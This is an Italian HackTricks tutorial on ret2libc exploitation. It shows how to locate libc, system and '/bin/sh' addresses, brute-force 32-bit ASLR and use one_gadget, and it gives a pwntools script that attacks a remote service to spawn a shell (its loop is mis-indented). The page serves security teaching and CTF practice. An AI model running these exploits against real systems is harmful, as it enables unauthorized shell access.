# Ret2lib

<details>

<summary><strong>Impara l'hacking AWS da zero a ero con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## **Informazioni di Base**

L'essenza di **Ret2Libc** √® quella di reindirizzare il flusso di esecuzione di un programma vulnerabile a una funzione all'interno di una libreria condivisa (ad esempio, **system**, **execve**, **strcpy**) anzich√© eseguire shellcode fornito dall'attaccante nello stack. L'attaccante crea un payload che modifica l'indirizzo di ritorno nello stack per puntare alla funzione della libreria desiderata, predisponendo anche eventuali argomenti necessari in base alla convenzione di chiamata.

### **Passaggi di Esempio (semplificati)**

* Ottenere l'indirizzo della funzione da chiamare (ad esempio, system) e il comando da chiamare (ad esempio, /bin/sh)
* Generare una catena ROP per passare il primo argomento puntando alla stringa del comando e il flusso di esecuzione alla funzione

## Trovare gli indirizzi

* Supponendo che la `libc` utilizzata sia quella della macchina corrente, puoi trovare dove verr√† caricata in memoria con:

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

Se vuoi verificare se l'ASLR sta cambiando l'indirizzo di libc, puoi fare:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* Sapendo quale libc √® utilizzato, √® anche possibile trovare l'offset alla funzione `system` con:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* Sapendo quale libc √® utilizzato, √® anche possibile trovare l'offset alla stringa della funzione `/bin/sh` con:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### Usando gdb-peda / GEF

Conoscendo la libc utilizzata, √® anche possibile utilizzare Peda o GEF per ottenere l'indirizzo della funzione **system**, della funzione **exit** e della stringa **`/bin/sh`** :
```
p system
p exit
find "/bin/sh"
```
### Usando /proc/\<PID>/maps

Se il processo crea **figli** ogni volta che si comunica con esso (server di rete) prova a **leggere** quel file (probabilmente avrai bisogno dei permessi di root).

Qui puoi trovare **esattamente dove √® caricata la libc** all'interno del processo e **dove verr√† caricata** per ogni figlio del processo.

![](<../../../../.gitbook/assets/image (95).png>)

In questo caso √® caricata in **0xb75dc000** (Questo sar√† l'indirizzo di base della libc)

## Libreria libc sconosciuta

Potrebbe essere possibile che **non conosci la libc che il binario sta caricando** (perch√© potrebbe trovarsi in un server a cui non hai accesso). In tal caso potresti sfruttare la vulnerabilit√† per **ottenere alcuni indirizzi e trovare quale libreria libc** viene utilizzata:

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

E puoi trovare un modello di pwntools per questo in:

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

## Bypassare ASLR in 32 bit

Questi attacchi di forza bruta sono **utili solo per sistemi a 32 bit**.

* Se l'exploit √® locale, puoi provare a forzare l'indirizzo di base della libc (utile per sistemi a 32 bit):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* Se si attacca un server remoto, si potrebbe provare a **forzare l'indirizzo della funzione `usleep` della `libc`**, passando come argomento 10 (ad esempio). Se a un certo punto il **server impiega 10 secondi in pi√π per rispondere**, hai trovato l'indirizzo di questa funzione.

## ONE\_GADGET

[**ONE\_GADGET**](https://github.com/david942j/one\_gadget) permette di ottenere una shell anzich√© utilizzare **system** e **"/bin/sh". ONE\_GADGET** trover√† all'interno della libreria libc un modo per ottenere una shell utilizzando un solo **indirizzo ROP**.\
Tuttavia, di solito ci sono alcune restrizioni, le pi√π comuni e facili da evitare sono come `[rsp+0x30] == NULL`. Poich√© controlli i valori all'interno del **RSP**, devi solo inviare alcuni valori NULL in pi√π in modo che la restrizione venga evitata.

![](<../../../../.gitbook/assets/image (615).png>)
```python
ONE_GADGET = libc.address + 0x4526a
rop2 = base + p64(ONE_GADGET) + "\x00"*100
```
## Esempio di Codice x86 Ret2lib

In questo esempio, la forza bruta ASLR √® integrata nel codice e il binario vulnerabile √® situato in un server remoto:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## Esempio di codice x64 Ret2lib

Controlla l'esempio da:

{% content-ref url="../rop-return-oriented-programing.md" %}
[rop-return-oriented-programing.md](../rop-return-oriented-programing.md)
{% endcontent-ref %}

## Ret-into-printf (o puts)

Questo permette di **ottenere informazioni dal processo** chiamando `printf`/`puts` con alcuni dati specifici posizionati come argomento.

## Ret2printf

Questo significa fondamentalmente abusare di un **Ret2lib per trasformarlo in una vulnerabilit√† di stringhe di formato `printf`** utilizzando il `ret2lib` per chiamare printf con i valori da sfruttare (sembra inutile ma √® possibile):

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

<details>

<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
